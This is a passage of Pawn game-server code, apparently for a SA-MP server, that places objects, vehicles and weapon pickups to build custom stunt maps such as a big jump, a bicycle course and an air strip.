	CreateVehicleEx(464,-988.3293,1094.9962,1342.2701,181.2768,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(464,-1078.4672,1054.5433,1342.6217,203.5840,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(501,-1131.6726,1041.7955,1345.1930,269.2417,14,75,respawntime,10,world_dm_rc); // dmz_rcheli
	CreateVehicleEx(501,-973.6234,1077.1642,1344.4451,88.7654,14,75,respawntime,10,world_dm_rc); // dmz_rcheli
	CreatePickupEx(356,2,-1087.0205,1047.3381,1347.1007,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1062.6301,1045.0300,1347.6165,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1062.7502,1060.6566,1347.1085,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1042.2548,1052.1958,1345.5155,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1043.2925,1099.1595,1345.2643,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1042.5052,1082.4576,1346.8914,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1042.0688,1068.3406,1346.5833,0,world_dm_rc); // newdmz_m4
	CreatePickupEx(356,2,-1024.1956,1075.7186,1346.9476,0,world_dm_rc); // newdmz_m4
	// 0.4.6 - BigJump (BroLeX):
	CreateSObject(4152, 1412.3538818359, -1259.1824951172, 126.00028991699, 65.505004882813, 0, 0);
	CreateSObject(4152, 1412.3720703125, -1284.9227294922, 69.704048156738, 65.505004882813, 0, 0);
	CreateSObject(4152, 1412.3265380859, -1300.4050292969, 38.126491546631, 45.654998779297, 0, 0);
	CreateSObject(4152, 1412.3520507813, -1326.4157714844, 12.485584259033, 19.850006103516, 0, 0);
	CreateSObject(1655, 1394.6370849609, -1478.7081298828, 9.4719867706299, 9.9249877929688, 0, 163.40002441406);
	CreateSObject(1655, 1393.0374755859, -1483.9025878906, 14.257692337036, 27.790008544922, 0, 163.44500732422);
	CreateSObject(1655, 1391.7053222656, -1487.9650878906, 20.784999847412, 41.684997558594, 0, 163.48999023438);
	CreateSObject(9192, 1399.8709716797, -1229.5535888672, 190.3011932373, 0, 0, 0);
	CreateSObject(7313, 1409.169921875, -1245.4720458984, 190.9133605957, 0, 0, 180.81506347656);
	CreateSObject(7290, 1409.0632324219, -1250.8581542969, 191.28419494629, 270.67498779297, 358.01501464844, 0);
	CreateSObject(6056, 1417.8315429688, -1236.0843505859, 186.94557189941, 304.41998291016, 0, 175.08502197266);
	CreateSObject(1337, 1393.6198730469, -1231.9295654297, 185.29368591309, 0, 0, 0);
	CreateVehicleEx(522,1411.6886,-1224.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6886,-1221.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6886,-1218.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6886,-1215.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6886,-1212.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6886,-1209.4199,186.7791,90.5122,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1206.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1203.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1200.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1197.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1194.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1191.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1188.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	CreateVehicleEx(522,1411.6484,-1185.4595,186.7835,90.7290,-1,-1,respawntime,0,world_normal); // bigjump_nrg
	// 0.4.6 - Bicycle (Rewind):
	CreateSObject(973, -55.100407, 446.658783, 1245.385864, 91.1003, 0.0000, 0.0000);
	CreateSObject(973, -63.897728, 445.048981, 1245.377930, 89.3814, 21.4859, 0.0000);
	CreateSObject(973, -72.643806, 444.671722, 1245.407471, 89.3814, 21.4859, 321.8755);
	CreateSObject(973, -79.745941, 446.959839, 1247.991577, 54.1445, 95.3974, 244.5263);
	CreateSObject(973, -87.526299, 449.796570, 1250.769531, 87.6625, 21.4859, 317.5783);
	CreateSObject(973, -94.428177, 455.197937, 1250.937378, 87.6625, 21.4859, 283.8283);
	CreateSObject(973, -99.386162, 461.864838, 1248.319580, 54.1445, 95.3974, 30.7762);
	CreateSObject(973, -103.583237, 467.350739, 1243.372925, 54.1445, 95.3974, 30.7762);
	CreateSObject(973, -108.175995, 473.428253, 1238.734985, 62.7389, 95.3974, 30.7762);
	CreateSObject(973, -113.939583, 479.844116, 1236.694824, 87.6625, 21.4859, 295.0783);
	CreateSObject(973, -121.619690, 484.548676, 1236.816528, 85.0842, 21.4859, 318.5924);
	CreateSObject(1651, -126.701019, 487.350525, 1237.011963, 358.2811, 274.0563, 342.8113);
	CreateSObject(973, -126.210548, 495.339142, 1239.601807, 54.1445, 95.3974, 151.9479);
	CreateSObject(973, -123.786324, 501.599091, 1244.440430, 54.1445, 95.3974, 151.9479);
	CreateSObject(973, -120.302475, 509.156036, 1247.054565, 87.6625, 21.4859, 41.4849);
	CreateSObject(1651, -127.784294, 490.580627, 1237.077637, 358.2811, 274.0563, 342.8113);
	CreateSObject(1651, -128.596939, 487.933258, 1237.145264, 358.2811, 274.0563, 342.8113);
	CreateSObject(973, -116.108757, 517.373596, 1246.944458, 87.6625, 21.4859, 41.4849);
	CreateSObject(997, -129.923965, 486.999084, 1237.335205, 0.8594, 2.5783, 344.3755);
	CreateSObject(997, -129.872971, 486.921234, 1237.302124, 1.7189, 0.8594, 74.3755);
	CreateSObject(2780, -115.088478, 519.117981, 1246.162598, 0.0000, 0.0000, 157.5000);
	CreateSObject(3525, -129.806992, 486.960846, 1238.839722, 353.1245, 1.7189, 0.0000);
	CreateSObject(1318, -129.407730, 488.592194, 1238.736816, 123.7589, 0.0000, 343.5161);
	CreateSObject(973, -112.032570, 525.388062, 1246.831055, 87.6625, 21.4859, 41.4849);
	CreateSObject(973, -107.987099, 533.316345, 1246.709595, 87.6625, 21.4859, 41.4849);
	CreateSObject(973, -103.928680, 541.266724, 1246.570923, 87.6625, 21.4859, 41.4849);
	CreateSObject(973, -99.672356, 549.581848, 1246.419556, 87.6625, 21.4859, 41.4849);
	CreateSObject(2780, -103.282425, 543.030945, 1246.028809, 0.0000, 0.0000, 157.5000);
	CreateSObject(973, -95.881248, 556.948059, 1243.662598, 54.1445, 95.3974, 325.9319);
	CreateSObject(973, -92.087242, 564.305908, 1240.968872, 87.6625, 21.4859, 41.4849);
	CreateSObject(973, -87.939339, 571.537598, 1238.187500, 54.1445, 95.3974, 319.9158);
	CreateSObject(3865, -82.429359, 576.876404, 1237.298340, 0.0000, 0.0000, 303.7500);
	CreateSObject(3865, -74.695091, 580.827332, 1236.721191, 353.1245, 0.0000, 292.5774);
	CreateSObject(3865, -66.952408, 581.753479, 1234.818726, 342.8113, 359.1406, 265.7028);
	CreateSObject(3865, -59.839241, 581.138123, 1232.608887, 342.8113, 359.1406, 265.7028);
	CreateSObject(16080, 57.783775, 583.159424, 1194.807739, 0.0000, 0.0000, 351.3283);
	CreateSObject(16080, 55.242664, 465.861969, 1175.168457, 0.0000, 352.2651, 258.7500);
	CreateSObject(16080, -61.908730, 468.427887, 1155.561279, 0.0000, 352.2651, 168.7501);
	CreateSObject(1523, -66.068008, 469.955261, 1156.084595, 0.0000, 0.0000, 270.0000);
	CreateSObject(1523, -65.988495, 466.966858, 1156.085938, 0.0000, 0.0000, 90.0000);
	CreateSObject(1214, -66.062996, 467.941315, 1158.638062, 0.0000, 0.0000, 0.0000);
	CreateSObject(1214, -66.063133, 468.982422, 1159.938843, 91.1003, 0.0000, 0.0000);
	CreateSObject(1214, -66.137848, 469.028931, 1158.728516, 91.1003, 0.0000, 0.0000);
	CreateSObject(1214, -66.037994, 469.010803, 1159.394653, 91.1003, 0.0000, 0.0000);
	CreateSObject(1985, -45.115211, 581.039978, 1229.287476, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -39.796021, 581.118042, 1227.747803, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -33.929932, 581.186279, 1225.872803, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -28.952553, 581.339539, 1224.509277, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -21.806000, 581.480225, 1222.139404, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -12.198895, 581.696350, 1219.269043, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, -4.705917, 581.940186, 1216.958984, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, 6.158276, 582.169128, 1213.708496, 0.0000, 0.0000, 0.0000);
	CreateSObject(1985, 18.844681, 582.341064, 1209.778564, 0.0000, 0.0000, 0.0000);
	CreateSObject(1218, 59.071785, 576.113647, 1194.205200, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 57.859230, 569.636292, 1193.110474, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 58.799145, 563.638672, 1192.185547, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 57.410748, 558.167725, 1191.219604, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 58.482269, 553.965271, 1190.610840, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 57.107033, 546.596008, 1189.284424, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 58.177258, 542.299500, 1188.647339, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 56.821743, 536.956177, 1187.719360, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 57.799667, 532.116516, 1186.974854, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 56.408264, 524.348999, 1185.657837, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 57.298367, 515.614563, 1184.189941, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 55.969589, 509.293152, 1183.141357, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 56.825085, 500.466217, 1181.769409, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 55.603798, 495.463440, 1180.909546, 11.1727, 354.8434, 356.5623);
	CreateSObject(1218, 55.759277, 484.336609, 1178.988403, 11.1727, 354.8434, 356.5623);
	CreateSObject(5342, 13.975231, 441.400085, 1245.503906, 0.0000, 0.0000, 180.0000);
	CreateVehicleEx(481,79.9801,444.1714,1246.0178,110.7570,3,3); // ofnaim
	CreateVehicleEx(481,79.4942,439.1021,1246.0162,67.2600,3,3); // ofnaim
	CreateVehicleEx(481,80.0687,436.6266,1246.0216,80.8929,3,3); // ofnaim
	// 0.4.6 - Air Strip (BloWeR):
	CreateSObject(12956, 341.643280, 2603.770752, 18.551264, 0.0000, 0.0000, 303.7500);
	CreateSObject(13641, 267.434753, 2523.194824, 17.382124, 0.0000, 0.0000, 180.0000);
	CreateSObject(18450, 552.292908, 2518.448486, 43.002304, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 628.533630, 2518.564209, 51.690720, 0.0000, 347.1084, 0.0000);
	CreateSObject(18450, 705.277466, 2518.560303, 72.298882, 0.0000, 342.8113, 0.0000);
	CreateSObject(18450, 779.868225, 2518.567139, 97.869141, 0.0000, 339.3735, 0.0000);
	CreateSObject(18450, 857.124390, 2518.558594, 111.926117, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 936.989807, 2518.564453, 111.913063, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1016.933228, 2518.560059, 111.900009, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1096.880981, 2518.544189, 111.911850, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1176.503418, 2518.540771, 111.898781, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1253.637329, 2518.540039, 118.410728, 0.0000, 350.5462, 0.0000);
	CreateSObject(18450, 1330.049438, 2518.537598, 138.346634, 0.0000, 340.2330, 0.0000);
	CreateSObject(18450, 1404.059692, 2518.533691, 166.841476, 0.0000, 337.6546, 0.0000);
	CreateSObject(18450, 1480.916626, 2518.544922, 182.019608, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1558.335205, 2518.551270, 194.282013, 0.0000, 341.9518, 0.0000);
	CreateSObject(18450, 1631.123535, 2518.572510, 223.218811, 0.0000, 334.2169, 0.0000);
	CreateSObject(18450, 1706.249512, 2518.576660, 248.311523, 0.0000, 348.8273, 0.0000);
	CreateSObject(18450, 1785.377808, 2518.571289, 256.053192, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 1864.676636, 2518.563477, 256.040100, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, 1900.776245, 2522.409912, 257.456238, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 1900.763184, 2518.278809, 257.456238, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 1900.734741, 2514.104492, 257.431244, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, 1973.844238, 2518.656738, 264.237488, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 2048.112305, 2518.673096, 267.674713, 0.0000, 354.8434, 0.0000);
	CreateSObject(18450, 2111.977295, 2518.647217, 276.416016, 0.0000, 349.6868, 0.0000);
	CreateSObject(18450, 2184.154297, 2518.632080, 293.642700, 0.0000, 343.6707, 0.0000);
	CreateSObject(18450, 2252.938721, 2518.642334, 317.146027, 0.0000, 338.5141, 0.0000);
	CreateSObject(18450, 2329.969482, 2518.746338, 331.761505, 0.0000, 0.0000, 0.1546);
	CreateSObject(18450, 2404.985107, 2500.234863, 338.925354, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 2366.126953, 2522.666992, 333.152527, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 2366.089844, 2518.504883, 333.152649, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 2366.079590, 2514.361572, 333.152649, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, 2415.032227, 2500.830566, 342.737732, 41.2530, 0.0000, 270.0000);
	CreateSObject(18450, 2404.978516, 2420.597168, 338.912750, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, 2414.977051, 2420.977051, 342.745270, 41.2530, 0.0000, 270.0000);
	CreateSObject(18450, 2404.980469, 2350.566406, 343.599915, 0.0000, 353.1245, 270.0000);
	CreateSObject(18450, 2404.980469, 2279.489258, 356.919891, 0.0000, 345.3896, 270.0000);
	CreateSObject(18450, 2404.979736, 2206.212402, 381.754333, 0.0000, 336.7952, 270.0000);
	CreateSObject(18450, 2404.998779, 2129.654785, 397.485748, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, 2405.018066, 2050.388916, 397.497772, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, 2405.024170, 1977.300781, 375.460358, 0.0000, 33.5180, 270.0000);
	CreateSObject(18450, 2404.732178, 1913.557495, 333.166077, 0.8594, 326.4820, 90.0000);
	CreateSObject(1632, 914.367065, 2522.301514, 113.331909, 0.0000, 0.0000, 270.0000);
	CreateSObject(1632, 914.355896, 2518.145996, 113.331909, 0.0000, 0.0000, 270.0000);
	CreateSObject(1632, 914.287354, 2513.979980, 113.306908, 0.0000, 0.0000, 270.0000);
	CreateSObject(16644, 339.939484, 2548.603271, 17.861761, 0.0000, 29.2208, 0.0000);
	CreateSObject(16644, 306.743622, 2542.385742, 21.493439, 0.0000, 0.0000, 0.0000);
	CreateSObject(18367, 285.055023, 2538.502441, 22.729813, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 254.472427, 2538.510254, 26.172447, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 223.797104, 2538.528564, 29.610332, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 193.097183, 2538.463623, 33.060467, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 162.492126, 2538.437988, 36.517605, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 132.334351, 2538.470459, 39.897282, 0.0000, 0.0000, 270.0000);
	CreateSObject(13641, 197.373047, 2522.451660, 17.467913, 0.0000, 0.0000, 0.0000);
	CreateSObject(983, 255.033646, 2516.365967, 16.302731, 0.0000, 0.0000, 0.0000);
	CreateSObject(983, 254.808502, 2529.113281, 16.488243, 0.0000, 0.0000, 0.0000);
	CreateSObject(982, 242.248505, 2513.158447, 16.263931, 0.0000, 0.0000, 270.0000);
	CreateSObject(984, 223.068954, 2513.166504, 16.227060, 0.0000, 0.0000, 270.0000);
	CreateSObject(983, 213.458221, 2513.179688, 16.273766, 0.0000, 0.0000, 270.0000);
	CreateSObject(983, 210.205658, 2516.392822, 16.329630, 0.0000, 0.0000, 0.0000);
	CreateSObject(982, 241.933868, 2532.280029, 16.488190, 0.0000, 0.0000, 270.0000);
	CreateSObject(984, 222.729858, 2532.293457, 16.398033, 0.0000, 0.0000, 270.0000);
	CreateSObject(983, 213.127182, 2532.308838, 16.447006, 0.0000, 0.0000, 270.0000);
	CreateSObject(983, 209.976501, 2529.098633, 16.447948, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 213.049179, 2516.021729, 16.044773, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 215.413605, 2515.378906, 16.033833, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 212.801270, 2521.766357, 16.131098, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 212.710266, 2525.063965, 16.180885, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 229.865677, 2516.102783, 16.034031, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 220.589600, 2520.884521, 16.111341, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 227.643341, 2518.041260, 16.063980, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 236.484253, 2518.208252, 16.058384, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 232.107178, 2524.021484, 16.146128, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 221.940582, 2526.686279, 16.181162, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 224.396057, 2521.078613, 16.110695, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 233.596436, 2516.344971, 16.034143, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 232.733704, 2520.958008, 16.101412, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 240.056824, 2517.339600, 16.042631, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 240.542603, 2524.080811, 16.139349, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 239.814072, 2520.756104, 16.092093, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 249.396622, 2526.357178, 16.178385, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 251.075714, 2523.473633, 16.135075, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 247.708191, 2517.286377, 16.040554, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 237.834808, 2526.753418, 16.179781, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 226.961182, 2527.884766, 16.200853, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 222.081055, 2517.288086, 16.058157, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 216.578003, 2517.088379, 16.060263, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 217.007645, 2521.882080, 16.128958, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 216.671143, 2528.542480, 16.213732, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 227.460083, 2524.833496, 16.162035, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 234.134964, 2528.876953, 16.217716, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 244.345612, 2527.890381, 16.200460, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 246.607498, 2523.963867, 16.139914, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 225.181335, 2517.030029, 16.051630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 219.562164, 2515.234131, 16.030836, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 218.676895, 2524.423340, 16.164076, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 222.970215, 2523.698242, 16.149740, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 228.363373, 2522.146484, 16.122494, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 212.215530, 2529.835938, 16.208078, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 220.563736, 2529.997559, 16.203514, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 231.829544, 2528.309570, 16.207340, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 247.010437, 2520.780029, 16.090837, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 251.140686, 2515.951416, 16.021564, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 250.840622, 2530.109131, 16.210442, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 240.115387, 2530.260986, 16.202513, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 236.241943, 2524.079346, 16.143221, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 243.036255, 2515.751709, 16.018108, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 230.234436, 2518.984863, 16.075233, 0.0000, 0.0000, 0.0000);
	CreateSObject(16644, 370.192322, 2471.785156, 18.236376, 0.0000, 323.9037, 0.0000);
	CreateSObject(615, 431.148621, 2537.700195, 15.243998, 0.0000, 0.0000, 0.0000);
	CreateSObject(615, 361.676636, 2442.038330, 15.470396, 0.0000, 0.0000, 0.0000);
	CreateSObject(619, 305.258972, 2533.054199, 15.966881, 0.0000, 0.0000, 247.5000);
	CreateSObject(619, 310.914093, 2551.682861, 15.964117, 0.0000, 0.0000, 56.2500);
	CreateSObject(3505, 379.409241, 2475.189453, 24.084049, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 430.579590, 2475.205322, 24.109049, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 289.447449, 2504.920654, 26.027563, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, 354.313080, 2507.047119, 16.581696, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, 354.349457, 2502.886719, 16.581696, 0.0000, 0.0000, 90.0001);
	CreateSObject(1634, 254.643677, 2503.028320, 27.418634, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, 254.603043, 2507.185547, 27.443632, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, 178.750458, 2504.902100, 37.027523, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 98.902313, 2504.909668, 37.014469, 0.0000, 0.0000, 0.0000);
	CreateSObject(1632, 63.358994, 2502.399414, 38.433319, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, 63.374760, 2506.508057, 38.433319, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, 57.710220, 2506.473145, 42.109715, 18.9076, 0.0000, 90.0000);
	CreateSObject(1632, 57.703033, 2502.465088, 42.109116, 18.9076, 0.0000, 90.0000);
	CreateSObject(1632, 54.960281, 2502.486328, 46.065994, 37.8152, 0.0000, 90.0000);
	CreateSObject(1632, 54.951977, 2506.450195, 46.055523, 37.8152, 0.0000, 90.0000);
	CreateSObject(1632, 52.947880, 2502.492676, 53.172283, 63.5983, 0.0000, 90.0000);
	CreateSObject(1632, 52.949783, 2506.440674, 53.189819, 63.5983, 0.0000, 90.0000);
	CreateSObject(1632, 53.255802, 2502.433105, 58.363968, 77.3492, 0.0000, 90.0000);
	CreateSObject(1632, 53.267567, 2506.407959, 58.383442, 77.3492, 0.0000, 90.0000);
	CreateSObject(1632, 55.949921, 2502.415039, 65.863396, 97.1163, 0.0000, 90.0000);
	CreateSObject(1632, 55.948498, 2506.460693, 65.846802, 97.1163, 0.0000, 90.0000);
	CreateSObject(1632, 60.242714, 2502.407471, 70.828362, 116.0238, 0.0000, 90.0000);
	CreateSObject(1632, 60.233261, 2506.394531, 70.787529, 116.0240, 0.0000, 90.0000);
	CreateSObject(18450, 110.725075, 2504.727051, 58.376438, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 189.974213, 2504.731201, 58.363354, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 269.856750, 2504.725098, 58.330555, 0.0000, 0.0000, 0.0000);
	CreateSObject(6965, 347.737061, 2534.736572, 18.439762, 0.0000, 0.0000, 0.0000);
	CreateSObject(9152, 347.915100, 2534.485107, 16.436300, 0.0000, 0.0000, 0.0000);
	CreateSObject(618, 345.453308, 2573.258057, 15.823265, 0.0000, 0.0000, 0.0000);
	CreateSObject(618, 464.490417, 2476.245117, 22.974991, 0.0000, 0.0000, 0.0000);
	CreateSObject(618, 261.292694, 2435.240723, 15.804386, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 363.131195, 2552.282959, 17.069588, 0.0000, 0.0000, 180.0000);
	CreateSObject(3374, 366.151001, 2552.294189, 19.864147, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 360.195801, 2552.337158, 20.069912, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 358.202728, 2552.295166, 23.069912, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 368.118500, 2552.232178, 22.864147, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 369.977661, 2552.181885, 25.864147, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 356.223083, 2552.332764, 26.069912, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 378.856628, 2552.222900, 17.068363, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 377.717743, 2552.293213, 20.068363, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 376.627319, 2552.306152, 23.068363, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 375.762512, 2552.307373, 26.068363, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 382.865356, 2552.225342, 17.066708, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 386.878265, 2552.175537, 17.058952, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 388.875732, 2552.079834, 20.058952, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 387.877014, 2552.080322, 23.058952, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 383.957062, 2552.041992, 23.179474, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 376.896027, 2552.222168, 29.068363, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 380.825500, 2552.158691, 30.110556, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 384.929932, 2552.208740, 29.860794, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 371.053345, 2552.136475, 28.864147, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 355.220093, 2552.265625, 29.069912, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 402.545715, 2552.301270, 16.956356, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 406.635254, 2552.427734, 16.918423, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 406.719513, 2552.535400, 19.918423, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 406.414490, 2552.423096, 22.918423, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 406.528076, 2552.327881, 25.918423, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 402.344635, 2552.277100, 22.894144, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 406.299652, 2552.369141, 28.918423, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 402.354645, 2552.362549, 28.939133, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 398.493164, 2552.139648, 16.986633, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 399.299591, 2552.227051, 22.910652, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 398.359589, 2552.362549, 28.917814, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 369.526794, 2530.317627, 17.219547, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 363.941956, 2530.688477, 17.246456, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 388.624329, 2530.534912, 17.114075, 0.0000, 0.0000, 0.0000);
	CreateSObject(7388, 412.949402, 2543.085449, 27.880701, 0.0000, 0.0000, 0.0000);
	CreateSObject(7916, 445.963135, 2561.853516, 19.205936, 0.0000, 0.0000, 315.0000);
	CreateSObject(8990, 361.991364, 2549.278320, 16.242031, 0.0000, 0.0000, 0.0000);
	CreateSObject(8990, 376.430420, 2549.727051, 16.242031, 0.0000, 0.0000, 0.0000);
	CreateSObject(8990, 390.787079, 2549.856201, 16.239521, 0.0000, 0.0000, 0.0000);
	CreateSObject(8990, 403.033142, 2549.386719, 16.377939, 0.0000, 0.0000, 0.0000);
	CreateSObject(8888, 385.802124, 2539.961914, 16.305189, 0.0000, 0.0000, 180.0000);
